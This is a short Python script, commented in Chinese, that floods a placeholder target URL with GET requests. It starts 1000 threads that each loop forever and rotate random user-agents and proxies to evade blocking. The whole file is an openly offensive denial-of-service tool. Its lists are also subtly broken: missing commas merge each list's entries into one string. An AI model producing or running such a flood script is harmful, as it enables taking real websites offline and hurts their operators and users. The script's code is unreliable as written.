import threading
import requests
import random

# 定义一组User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0'
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15'
    # ... 可以添加更多的user-agents
]

# 代理列表，格式为 'http://IP:PORT' 或 'https://IP:PORT'
PROXIES_LIST = [
    'http://10.10.1.10:3128'
    'http://10.10.1.11:3128'
    # ... 添加更多的代理
]

def run(url):
    while True:
        # 随机选择一个User-Agent
        headers = {
            'user-agent': random.choice(USER_AGENTS)
        }

        # 随机选择一个代理
        proxies = {
            'http': random.choice(PROXIES_LIST),
            'https': random.choice(PROXIES_LIST)
        }

        try:
            response = requests.get(url, headers=headers, proxies=proxies, timeout=5)
            print('状态码:', response.status_code)
        except requests.RequestException as e:
            print(f"请求错误: {e}")


# 使用更合理的线程数量，例如1000
for i in range(1000):
    threading.Thread(target=run, args=('YOUR_TARGET_URL',)).start()
